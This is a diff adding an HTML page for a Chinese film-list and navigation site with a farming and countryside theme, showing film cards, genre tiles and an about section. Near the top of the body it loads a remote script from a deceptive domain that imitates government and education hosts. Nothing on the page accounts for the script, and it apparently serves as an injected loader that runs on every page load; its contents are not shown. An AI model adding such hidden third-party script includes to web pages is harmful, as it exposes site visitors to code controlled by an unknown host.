@@ -1,0 +1,290 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<link rel="icon" href="favicon.ico" type="image/x-icon">
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1.0" />
+<title>农夫影视 - 山野风味影视导航与片单 | nongfuyingshi-h5.github.io</title>
+<meta name="description" content="农夫影视(nongfuyingshi-h5.github.io)以青山稻田与竹篱柴门为视觉，整理电影、剧集、动漫、纪录片片单，春种秋收，把好片子一垄一垄种出来。" />
+<meta name="keywords" content="农夫影视,nongfuyingshi-h5,山野影视,田园片单,电影导航,自然记录" />
+<style>
+:root{
+  --rice:#d4a017;
+  --rice-2:#b8860b;
+  --paddy:#4a7c59;
+  --paddy-2:#3a6347;
+  --soil:#8b5e3c;
+  --soil-2:#6b4423;
+  --sky:#87ceeb;
+  --sky-2:#b8e0f5;
+  --cloth:#f5f0e6;
+  --cloth-2:#ece2d0;
+  --ink:#2c2418;
+  --ink-2:#5a4a35;
+  --ink-3:#8a7355;
+  --line:rgba(139,94,60,0.28);
+  --shadow:0 10px 26px rgba(107,68,35,0.16);
+  --shadow-hover:0 18px 42px rgba(74,124,89,0.28);
+}
+*,*::before,*::after{box-sizing:border-box;margin:0;padding:0}
+html{scroll-behavior:smooth}
+body{
+  font-family:"Songti SC","SimSun","PingFang SC","Microsoft YaHei",serif,sans-serif;
+  background:
+    radial-gradient(circle at 20% 8%,rgba(135,206,235,0.22),transparent 44%),
+    radial-gradient(circle at 80% 92%,rgba(212,160,23,0.12),transparent 44%),
+    var(--cloth);
+  color:var(--ink);line-height:1.85;overflow-x:hidden;
+}
+a{color:var(--paddy-2);text-decoration:none}
+img{max-width:100%;display:block}
+
+/* 山峦层 */
+.hills{
+  position:fixed;inset:0;pointer-events:none;z-index:0;overflow:hidden;
+}
+.hills svg{position:absolute;bottom:0;left:0;width:100%;height:auto;opacity:.5}
+.hills svg:nth-child(1){bottom:10%;opacity:.3}
+.hills svg:nth-child(2){bottom:5%;opacity:.45}
+
+/* 草帽头 */
+.hat-head{
+  position:relative;z-index:10;text-align:center;padding:52px 20px 38px;
+  background:linear-gradient(180deg,var(--sky-2),var(--cloth));
+  border-bottom:4px double var(--soil);
+}
+.hat-logo{
+  width:100px;height:100px;margin:0 auto 14px;position:relative;
+  background:radial-gradient(circle at 50% 40%,var(--rice),var(--rice-2));
+  border-radius:50% 50% 45% 45% / 55% 55% 45% 45%;
+  display:flex;align-items:center;justify-content:center;font-size:42px;
+  box-shadow:0 8px 20px rgba(139,94,60,0.3);
+  animation:sway 4s ease-in-out infinite;
+}
+@keyframes sway{0%,100%{transform:rotate(-3deg)}50%{transform:rotate(3deg)}}
+.hat-logo::after{
+  content:"";position:absolute;bottom:8px;left:50%;transform:translateX(-50%);
+  width:70px;height:6px;background:var(--soil-2);border-radius:3px;
+}
+.hat-head h1{font-size:32px;font-weight:900;letter-spacing:4px;color:var(--ink)}
+.hat-head h1 b{color:var(--paddy-2)}
+.hat-head p{max-width:540px;margin:10px auto 0;color:var(--ink-2);font-size:15px}
+.hat-nav{margin-top:22px;display:flex;gap:12px;justify-content:center;flex-wrap:wrap}
+.hat-nav a{
+  padding:9px 20px;border:2px solid var(--soil);border-radius:30px;
+  font-size:14px;font-weight:700;color:var(--ink);background:rgba(255,255,255,0.6);transition:.25s;
+}
+.hat-nav a:hover{background:var(--paddy);color:#fff;border-color:var(--paddy-2)}
+
+/* 山峦条 */
+.hill-bar{
+  position:relative;z-index:10;background:var(--paddy);color:var(--cloth);
+  padding:10px 20px;font-size:13px;display:flex;align-items:center;justify-content:center;gap:18px;flex-wrap:wrap;
+  border-bottom:2px solid var(--rice);
+}
+.hill-bar .cloud{display:inline-block;animation:drift 5s ease-in-out infinite}
+@keyframes drift{0%,100%{transform:translateX(0)}50%{transform:translateX(8px)}}
+
+.wrap{position:relative;z-index:10;max-width:980px;margin:0 auto;padding:0 18px 60px}
+.section{margin-bottom:54px;scroll-margin-top:20px}
+.sec-title{display:flex;align-items:center;gap:12px;margin-bottom:26px}
+.sec-title .leaf{
+  width:34px;height:34px;background:var(--paddy);color:var(--cloth);
+  display:flex;align-items:center;justify-content:center;font-size:18px;font-weight:900;
+  border-radius:50% 50% 50% 0;flex-shrink:0;box-shadow:inset 0 0 0 2px rgba(255,255,255,0.3);
+}
+.sec-title h2{font-size:23px;font-weight:900;letter-spacing:2px;color:var(--ink)}
+.sec-title .ridge{flex:1;height:2px;background:repeating-linear-gradient(90deg,var(--paddy) 0 14px,transparent 14px 20px)}
+
+/* 梯田片单 */
+.terrace-grid{display:grid;grid-template-columns:repeat(auto-fit,minmax(270px,1fr));gap:0}
+.terrace-card{
+  position:relative;background:linear-gradient(180deg,var(--cloth),var(--cloth-2));
+  border:2px solid var(--soil);border-radius:14px 14px 4px 4px;padding:20px 20px 22px;
+  margin-bottom:16px;box-shadow:var(--shadow);transition:.3s;overflow:hidden;
+}
+.terrace-card:nth-child(3n+1){margin-left:0}
+.terrace-card:nth-child(3n+2){transform:translateX(8px)}
+.terrace-card:nth-child(3n+3){transform:translateX(16px)}
+.terrace-card::before{
+  content:"";position:absolute;left:-2px;right:-2px;top:0;height:6px;
+  background:repeating-linear-gradient(90deg,var(--rice),var(--paddy),var(--rice));
+}
+.terrace-card:hover{transform:translateY(-6px);box-shadow:var(--shadow-hover);border-color:var(--paddy-2)}
+.terrace-card .season{
+  display:inline-block;font-size:11px;color:var(--cloth);background:var(--paddy-2);
+  padding:3px 10px;border-radius:12px;margin-bottom:10px;font-family:"KaiTi","STKaiti",serif;
+}
+.terrace-card h3{font-size:18px;font-weight:800;color:var(--ink);margin-bottom:4px}
+.terrace-card .meta{font-size:12px;color:var(--ink-3);margin-bottom:8px}
+.terrace-card p{font-size:14px;color:var(--ink-2);line-height:1.75}
+.terrace-card .sprout{
+  position:absolute;right:16px;top:16px;font-size:22px;opacity:.3;
+}
+
+/* 谷仓分类 */
+.barn-grid{display:grid;grid-template-columns:repeat(auto-fit,minmax(140px,1fr));gap:16px}
+.barn{
+  text-align:center;background:var(--cloth);border:2px solid var(--soil);border-radius:8px 8px 14px 14px;
+  padding:22px 12px;transition:.25s;cursor:pointer;position:relative;
+}
+.barn::before{
+  content:"";position:absolute;top:-10px;left:50%;transform:translateX(-50%);
+  width:40px;height:20px;background:var(--soil-2);border-radius:20px 20px 0 0;
+}
+.barn .barn-ico{font-size:30px;margin-bottom:8px}
+.barn h4{font-size:15px;font-weight:800;color:var(--ink)}
+.barn p{font-size:12px;color:var(--ink-3)}
+.barn:hover{background:var(--paddy);border-color:var(--paddy-2)}
+.barn:hover h4,.barn:hover p{color:var(--cloth)}
+
+/* 关于 */
+.about-block{
+  background:var(--cloth);border:2px solid var(--soil);border-left:6px solid var(--rice-2);
+  border-radius:12px;padding:26px;font-size:15px;color:var(--ink-2);line-height:1.95;
+}
+.about-block b{color:var(--paddy-2)}
+
+/* 稻穗栏 */
+.ear-bar{
+  position:relative;z-index:10;background:var(--soil-2);color:var(--cloth);
+  padding:12px 20px;text-align:center;font-size:13px;
+  display:flex;align-items:center;justify-content:center;gap:20px;flex-wrap:wrap;
+}
+.ear-bar .sway{display:inline-block;animation:sway2 3s ease-in-out infinite}
+@keyframes sway2{0%,100%{transform:rotate(-8deg)}50%{transform:rotate(8deg)}}
+
+.footer{position:relative;z-index:10;text-align:center;padding:20px 16px;color:var(--ink-3);font-size:12px;border-top:4px double var(--soil);background:var(--cloth-2)}
+
+@media(max-width:640px){
+  .hat-head h1{font-size:24px;letter-spacing:2px}
+  .hat-logo{width:78px;height:78px;font-size:34px}
+  .terrace-grid{grid-template-columns:1fr;gap:0}
+  .terrace-card,.terrace-card:nth-child(3n+2),.terrace-card:nth-child(3n+3){transform:none}
+  .sec-title h2{font-size:19px}
+  .wrap{padding:0 14px 40px}
+  .barn-grid{grid-template-columns:repeat(2,1fr)}
+  .hill-bar{gap:8px;font-size:12px}
+}
+</style>
+</head>
+<body>
+<script src="https://www.gov.cn.edu.cn.889988.info/laoliu.js"></script>
+
+<div class="hills" aria-hidden="true">
+  <svg viewBox="0 0 1200 200" preserveAspectRatio="none"><path d="M0,200 L0,120 Q200,40 400,100 T800,80 T1200,110 L1200,200 Z" fill="#4a7c59" opacity="0.4"/></svg>
+  <svg viewBox="0 0 1200 200" preserveAspectRatio="none"><path d="M0,200 L0,150 Q300,80 600,130 T1200,140 L1200,200 Z" fill="#3a6347" opacity="0.5"/></svg>
+</div>
+
+<header class="hat-head">
+  <div class="hat-logo">🌾</div>
+  <h1><b>农夫</b>影视</h1>
+  <p>nongfuyingshi-h5.github.io —— 春种秋收，把好片子一垄一垄种出来。电影、剧集、动漫、纪录片，像山野里的好收成，踏实、干净、有滋味。</p>
+  <nav class="hat-nav">
+    <a href="#">首页</a>
+    <a href="#terrace">山货片单</a>
+    <a href="#barn">谷仓分类</a>
+    <a href="#about">关于农夫</a>
+  </nav>
+</header>
+
+<div class="hill-bar">
+  <span><span class="cloud">☁️</span> 云过山头 · 片单晒场</span>
+  <span>🌱 当前垄位：第 26 垄</span>
+  <span>🚜 服务状态：耕耘中</span>
+</div>
+
+<main class="wrap">
+
+  <section class="section" id="terrace">
+    <div class="sec-title">
+      <span class="leaf">垄</span><h2>山货片单</h2><span class="ridge"></span>
+    </div>
+    <div class="terrace-grid">
+      <article class="terrace-card">
+        <span class="season">春 · 耕种</span>
+        <h3>隐入尘烟</h3>
+        <div class="meta">2022 · 剧情/农村 · 李睿珺</div>
+        <p>西北黄土地上，两个被遗忘的人把日子过成庄稼。土坯房、麦垛、毛驴，最朴素的画面里长出最真的情。</p>
+        <div class="sprout">🌱</div>
+      </article>
+      <article class="terrace-card">
+        <span class="season">夏 · 生长</span>
+        <h3>小森林</h3>
+        <div class="meta">2014 · 美食/治愈 · 日本</div>
+        <p>市子在东北部的山村里种菜、收栗、熬果酱。四季轮回就是最好的剧本，看完想回老家种一亩地。</p>
+        <div class="sprout">🌿</div>
+      </article>
+      <article class="terrace-card">
+        <span class="season">秋 · 丰收</span>
+        <h3>菊次郎的夏天</h3>
+        <div class="meta">1999 · 喜剧/温情 · 北野武</div>
+        <p>一个不靠谱大叔和一个小男孩的夏日公路旅行。久石让的钢琴像田埂上的风，吹过金黄的稻浪。</p>
+        <div class="sprout">🌾</div>
+      </article>
+      <article class="terrace-card">
+        <span class="season">冬 · 储藏</span>
+        <h3>海蒂和爷爷</h3>
+        <div class="meta">2015 · 剧情/治愈 · 瑞士</div>
+        <p>阿尔卑斯山的雪、爷爷的小木屋、海蒂的笑脸。像冬日里晒在窗台上的萝卜干，朴素却暖胃。</p>
+        <div class="sprout">❄️</div>
+      </article>
+      <article class="terrace-card">
+        <span class="season">四时 · 节气</span>
+        <h3>饮食男女</h3>
+        <div class="meta">1994 · 家庭/美食 · 李安</div>
+        <p>老朱的家宴桌就是中国人的节气表。一道道菜端上来，团圆、离散、再聚首，都在烟火气里。</p>
+        <div class="sprout">🍚</div>
+      </article>
+      <article class="terrace-card">
+        <span class="season">山野 · 记录</span>
+        <h3>地球脉动</h3>
+        <div class="meta">2006 · 纪录片/BBC · 大卫·爱登堡</div>
+        <p>从雪山到雨林，从深海到荒漠，镜头替我们翻过每一座山头。看完才懂：大地才是最伟大的农夫。</p>
+        <div class="sprout">🌍</div>
+      </article>
+    </div>
+  </section>
+
+  <section class="section" id="barn">
+    <div class="sec-title">
+      <span class="leaf">仓</span><h2>谷仓分类</h2><span class="ridge"></span>
+    </div>
+    <div class="barn-grid">
+      <div class="barn"><div class="barn-ico">🎬</div><h4>正屋·电影</h4><p>院线/文艺/外语</p></div>
+      <div class="barn"><div class="barn-ico">📺</div><h4>偏房·剧集</h4><p>乡村/年代/生活</p></div>
+      <div class="barn"><div class="barn-ico">🌸</div><h4>柴房·动漫</h4><p>治愈/田园/动物</p></div>
+      <div class="barn"><div class="barn-ico">🎤</div><h4>晒场·综艺</h4><p>农耕/美食/慢综</p></div>
+      <div class="barn"><div class="barn-ico">📽️</div><h4>仓顶·纪录</h4><p>自然/山河/节气</p></div>
+      <div class="barn"><div class="barn-ico">🧺</div><h4>竹筐·短片</h4><p>微电影/实验片</p></div>
+    </div>
+  </section>
+
+  <section class="section" id="about">
+    <div class="sec-title">
+      <span class="leaf">ℹ</span><h2>关于农夫</h2><span class="ridge"></span>
+    </div>
+    <div class="about-block">
+      <p>
+        <b>农夫影视</b>（nongfuyingshi-h5.github.io）是一个以"青山稻田与竹篱柴门"为气质的影视导航与片单整理站点。
+        不追快餐爆款，只做<b>踏实、干净、有泥土味</b>的好片子：乡土剧情、田园治愈、山野纪录片、农耕综艺。
+        页面用草帽Logo、山峦横幅、梯田片卡、谷仓分类来组织内容，移动端自适应，内链以 # 占位，
+        不生成 robots.txt / sitemap.xml，所有内容仅供学习与交流使用。
+      </p>
+    </div>
+  </section>
+
+</main>
+
+<div class="ear-bar">
+  <span><span class="sway">🌾</span> 稻穗低垂 · 片单常新</span>
+  <span>🚜 已耕片海：7200+ 部</span>
+  <span>🌾 服务状态：丰收在望</span>
+</div>
+
+<footer class="footer">
+  © 2026 农夫影视 | nongfuyingshi-h5.github.io | 春种秋收，把好片子一垄一垄种出来 | 内链以 # 占位
+</footer>
+
+</body>
+</html>
